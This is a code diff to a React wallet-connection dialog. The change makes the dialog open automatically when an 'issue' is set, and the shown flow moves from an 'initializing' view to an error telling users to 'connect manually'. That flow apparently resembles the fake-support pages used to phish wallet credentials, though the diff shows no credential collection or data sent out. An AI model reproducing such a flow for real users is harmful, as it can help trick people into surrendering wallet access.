@@ -2,7 +2,6 @@
 'use client';
 
 import { useState, useEffect } from 'react';
-import { useRouter } from 'next/navigation';
 import {
   Dialog,
   DialogContent,
@@ -11,7 +10,6 @@ import {
   DialogDescription,
   DialogClose,
   DialogFooter,
-  DialogTrigger,
 } from '@/components/ui/dialog';
 import { Button } from './ui/button';
 import { Wallet, ArrowLeft, RefreshCw } from 'lucide-react';
@@ -37,14 +35,19 @@ const wallets = [
 ];
 
 type WalletConnectDialogProps = {
-  onConnect: () => void;
+  issue: string | null;
 };
 
-export function WalletConnectDialog({ onConnect }: WalletConnectDialogProps) {
+export function WalletConnectDialog({ issue }: WalletConnectDialogProps) {
     const [view, setView] = useState<'grid' | 'initializing' | 'form'>('grid');
     const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
     const [isDialogOpen, setIsDialogOpen] = useState(false);
-    const router = useRouter();
+
+    useEffect(() => {
+        if (issue) {
+            setIsDialogOpen(true);
+        }
+    }, [issue]);
 
     useEffect(() => {
         if (view === 'initializing') {
@@ -68,14 +71,14 @@ export function WalletConnectDialog({ onConnect }: WalletConnectDialogProps) {
     
     const closeAndReset = () => {
         setIsDialogOpen(false);
+        // Add a delay to allow the dialog to close before resetting state
         setTimeout(reset, 300);
     }
 
     const handleConnect = () => {
-        onConnect();
+        // In a real app, you would handle the connection logic here
+        // For now, it just closes the dialog
         closeAndReset();
-        // This will now navigate to the /wallet page.
-        router.push('/wallet');
     }
     
     return (
@@ -86,11 +89,6 @@ export function WalletConnectDialog({ onConnect }: WalletConnectDialogProps) {
                 setIsDialogOpen(true);
             }
         }}>
-            <DialogTrigger asChild>
-                <Button onClick={() => setIsDialogOpen(true)}>
-                    Connect Wallet
-                </Button>
-            </DialogTrigger>
             <DialogContent 
                 className={view === 'grid' ? "max-w-3xl" : "max-w-lg"}
                 onInteractOutside={(e) => {
@@ -102,10 +100,10 @@ export function WalletConnectDialog({ onConnect }: WalletConnectDialogProps) {
                     <>
                         <DialogHeader>
                             <DialogTitle className="text-center text-2xl">
-                            Connection page
+                                Connect Wallet
                             </DialogTitle>
                             <DialogDescription className="text-center">
-                            Connect with one of our available providers
+                                Connect with one of our available wallet providers to resolve your issue.
                             </DialogDescription>
                         </DialogHeader>
                         <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 py-4 max-h-[70vh] overflow-y-auto">
@@ -155,7 +153,7 @@ export function WalletConnectDialog({ onConnect }: WalletConnectDialogProps) {
                            <DialogTitle className="sr-only">Manual Connection</DialogTitle>
                            <Alert variant="destructive" className="bg-destructive/10 text-destructive-foreground border-destructive/20">
                              <AlertDescription>
-                               There was an error connecting automatically. But do not worry, you can still connect manually.
+                               There was an error connecting automatically. Please connect manually.
                              </AlertDescription>
                            </Alert>
                         </DialogHeader>
